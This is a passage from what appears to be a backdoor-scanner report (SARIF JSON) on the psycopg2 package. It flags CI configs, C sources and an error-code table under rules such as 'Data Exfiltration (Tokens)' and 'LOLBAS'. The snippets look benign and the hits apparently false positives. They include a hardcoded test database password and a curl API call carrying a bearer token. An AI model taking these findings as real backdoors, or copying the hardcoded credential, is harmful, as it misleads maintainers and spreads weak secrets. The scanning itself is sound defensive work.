          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/packages.yml"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 12,
                  "snippet": {
                    "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                    "rendered": {
                      "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                      "markdown": "`  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 1,
                  "endLine": 56,
                  "endColumn": 9,
                  "snippet": {
                    "text": "  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n",
                    "rendered": {
                      "text": "  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n",
                      "markdown": "`  # (See the file to zap the cache manually)\n  - C:\\Others -> .appveyor\\cache_rebuild\n\n# Script called before repo cloning\n# init:\n\n# Repository gets cloned, Cache is restored\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 28,
                  "endLine": 48,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n",
                    "rendered": {
                      "text": "  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n",
                      "markdown": "`  fast_finish: false\n\nservices:\n  # Note: if you change this service also change POSTGRES_DIR\n  - postgresql96\n\ncache:\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 38,
                  "startColumn": 27,
                  "endLine": 38,
                  "endColumn": 36,
                  "snippet": {
                    "text": "  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n",
                    "rendered": {
                      "text": "  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n",
                      "markdown": "`  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n  POSTGRES_DIR: C:\\Program Files\\PostgreSQL\\9.6\\\n\n  # The python used in the build process, not the one packages are built for\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 35,
                  "startColumn": 14,
                  "endLine": 35,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n",
                    "rendered": {
                      "text": "  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n",
                      "markdown": "`  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n  PERL5LIB: .\n\n  # Select according to the service enabled\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 14,
                  "endLine": 32,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                    "rendered": {
                      "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                      "markdown": "`  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/tests.yml"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 4,
                  "endLine": 32,
                  "endColumn": 12,
                  "snippet": {
                    "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                    "rendered": {
                      "text": "  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n",
                      "markdown": "`  PSYCOPG2_TESTDB_HOST: localhost\n\n  PGUSER: postgres\n  PGPASSWORD: Password12!\n  PGSSLMODE: require\n\n  # Add CWD to perl library path for PostgreSQL build on VS2019\n`"
                    }
                  },
                  "sourceLanguage": "yaml"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/cache_rebuild"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 24,
                  "endLine": 6,
                  "endColumn": 32,
                  "snippet": {
                    "text": "the cache needs updating.  Note, the versions list here can be\ndifferent than what is indicated in appveyor.yml.\n\nTo invalidate the cache, update this file and check it into git.\n\n\nCurrently used modules built in the cache:\n",
                    "rendered": {
                      "text": "the cache needs updating.  Note, the versions list here can be\ndifferent than what is indicated in appveyor.yml.\n\nTo invalidate the cache, update this file and check it into git.\n\n\nCurrently used modules built in the cache:\n",
                      "markdown": "`the cache needs updating.  Note, the versions list here can be\ndifferent than what is indicated in appveyor.yml.\n\nTo invalidate the cache, update this file and check it into git.\n\n\nCurrently used modules built in the cache:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/.appveyor/cache_rebuild"
                },
                "region": {
                  "startLine": 17,
                  "endLine": 17,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\nNOTE: to zap the cache manually you can also use:\n\n\tcurl -X DELETE -H \"Authorization: Bearer $APPVEYOR_TOKEN\" -H \"Content-Type: application/json\" https://ci.appveyor.com/api/projects/psycopg/psycopg2/buildcache\n\nwith the token from https://ci.appveyor.com/api-token\n",
                    "rendered": {
                      "text": "\nNOTE: to zap the cache manually you can also use:\n\n\tcurl -X DELETE -H \"Authorization: Bearer $APPVEYOR_TOKEN\" -H \"Content-Type: application/json\" https://ci.appveyor.com/api/projects/psycopg/psycopg2/buildcache\n\nwith the token from https://ci.appveyor.com/api-token\n",
                      "markdown": "`\nNOTE: to zap the cache manually you can also use:\n\n\tcurl -X DELETE -H \"Authorization: Bearer $APPVEYOR_TOKEN\" -H \"Content-Type: application/json\" https://ci.appveyor.com/api/projects/psycopg/psycopg2/buildcache\n\nwith the token from https://ci.appveyor.com/api-token\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_binary.c"
                },
                "region": {
                  "startLine": 212,
                  "startColumn": 50,
                  "endLine": 212,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    Py_CLEAR(self->buffer);\n    Py_CLEAR(self->conn);\n\n    Dprintf(\"binary_dealloc: deleted binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "    Py_CLEAR(self->buffer);\n    Py_CLEAR(self->conn);\n\n    Dprintf(\"binary_dealloc: deleted binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`    Py_CLEAR(self->buffer);\n    Py_CLEAR(self->conn);\n\n    Dprintf(\"binary_dealloc: deleted binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_binary.c"
                },
                "region": {
                  "startLine": 197,
                  "startColumn": 45,
                  "endLine": 197,
                  "endColumn": 49,
                  "snippet": {
                    "text": "    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"binary_setup: good binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n",
                    "rendered": {
                      "text": "    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"binary_setup: good binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n",
                      "markdown": "`    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"binary_setup: good binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_binary.c"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 45,
                  "endLine": 187,
                  "endColumn": 49,
                  "snippet": {
                    "text": "static int\nbinary_setup(binaryObject *self, PyObject *str)\n{\n    Dprintf(\"binary_setup: init binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\nbinary_setup(binaryObject *self, PyObject *str)\n{\n    Dprintf(\"binary_setup: init binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\nbinary_setup(binaryObject *self, PyObject *str)\n{\n    Dprintf(\"binary_setup: init binary object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 194,
                  "startColumn": 59,
                  "endLine": 194,
                  "endColumn": 63,
                  "snippet": {
                    "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"mpydatetime_dealloc: deleted pydatetime object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n",
                    "rendered": {
                      "text": "\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"mpydatetime_dealloc: deleted pydatetime object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n",
                      "markdown": "`\n    Py_CLEAR(self->wrapped);\n\n    Dprintf(\"mpydatetime_dealloc: deleted pydatetime object at %p, \"\n            \"refcnt = \" FORMAT_CODE_PY_SSIZE_T, obj, Py_REFCNT(obj));\n\n    Py_TYPE(obj)->tp_free(obj);\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 181,
                  "startColumn": 53,
                  "endLine": 181,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pydatetime_setup: good pydatetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n",
                    "rendered": {
                      "text": "    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pydatetime_setup: good pydatetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n",
                      "markdown": "`    Py_INCREF(obj);\n    self->wrapped = obj;\n\n    Dprintf(\"pydatetime_setup: good pydatetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n    return 0;\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 173,
                  "startColumn": 51,
                  "endLine": 173,
                  "endColumn": 55,
                  "snippet": {
                    "text": "static int\npydatetime_setup(pydatetimeObject *self, PyObject *obj, int type)\n{\n    Dprintf(\"pydatetime_setup: init datetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n",
                    "rendered": {
                      "text": "static int\npydatetime_setup(pydatetimeObject *self, PyObject *obj, int type)\n{\n    Dprintf(\"pydatetime_setup: init datetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n",
                      "markdown": "`static int\npydatetime_setup(pydatetimeObject *self, PyObject *obj, int type)\n{\n    Dprintf(\"pydatetime_setup: init datetime object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self));\n\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 7,
                  "endLine": 75,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::timestamp\" : \"'%s'::timestamptz\";\n        Py_DECREF(tz);\n        break;\n    }\n",
                    "rendered": {
                      "text": "    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::timestamp\" : \"'%s'::timestamptz\";\n        Py_DECREF(tz);\n        break;\n    }\n",
                      "markdown": "`    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::timestamp\" : \"'%s'::timestamptz\";\n        Py_DECREF(tz);\n        break;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 7,
                  "endLine": 70,
                  "endColumn": 12,
                  "snippet": {
                    "text": "        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n        fmt = \"'%s'::date\";\n        break;\n    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n",
                    "rendered": {
                      "text": "        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n        fmt = \"'%s'::date\";\n        break;\n    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n",
                      "markdown": "`        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n        fmt = \"'%s'::date\";\n        break;\n    case PSYCO_DATETIME_TIMESTAMP:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_datetime.c"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 7,
                  "endLine": 66,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    case PSYCO_DATETIME_TIME:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::time\" : \"'%s'::timetz\";\n        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n",
                    "rendered": {
                      "text": "    case PSYCO_DATETIME_TIME:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::time\" : \"'%s'::timetz\";\n        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n",
                      "markdown": "`    case PSYCO_DATETIME_TIME:\n        tz = PyObject_GetAttrString(self->wrapped, \"tzinfo\");\n        if (!tz) { goto error; }\n        fmt = (tz == Py_None) ? \"'%s'::time\" : \"'%s'::timetz\";\n        Py_DECREF(tz);\n        break;\n    case PSYCO_DATETIME_DATE:\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 142,
                  "startColumn": 10,
                  "endLine": 142,
                  "endColumn": 52,
                  "snippet": {
                    "text": "{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n{\"25P01\", \"NoActiveSqlTransaction\"},\n{\"25P02\", \"InFailedSqlTransaction\"},\n",
                    "rendered": {
                      "text": "{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n{\"25P01\", \"NoActiveSqlTransaction\"},\n{\"25P02\", \"InFailedSqlTransaction\"},\n",
                      "markdown": "`{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n{\"25P01\", \"NoActiveSqlTransaction\"},\n{\"25P02\", \"InFailedSqlTransaction\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 140,
                  "startColumn": 10,
                  "endLine": 140,
                  "endColumn": 54,
                  "snippet": {
                    "text": "{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n",
                    "rendered": {
                      "text": "{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n",
                      "markdown": "`{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n{\"25008\", \"HeldCursorRequiresSameIsolationLevel\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 10,
                  "endLine": 139,
                  "endColumn": 59,
                  "snippet": {
                    "text": "{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n",
                    "rendered": {
                      "text": "{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n",
                      "markdown": "`{\"25001\", \"ActiveSqlTransaction\"},\n{\"25002\", \"BranchTransactionAlreadyActive\"},\n{\"25003\", \"InappropriateAccessModeForBranchTransaction\"},\n{\"25004\", \"InappropriateIsolationLevelForBranchTransaction\"},\n{\"25005\", \"NoActiveSqlTransactionForBranchTransaction\"},\n{\"25006\", \"ReadOnlySqlTransaction\"},\n{\"25007\", \"SchemaAndDataStatementMixingNotSupported\"},\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/sqlstate_errors.h"
                },
                "region": {
                  "startLine": 138,
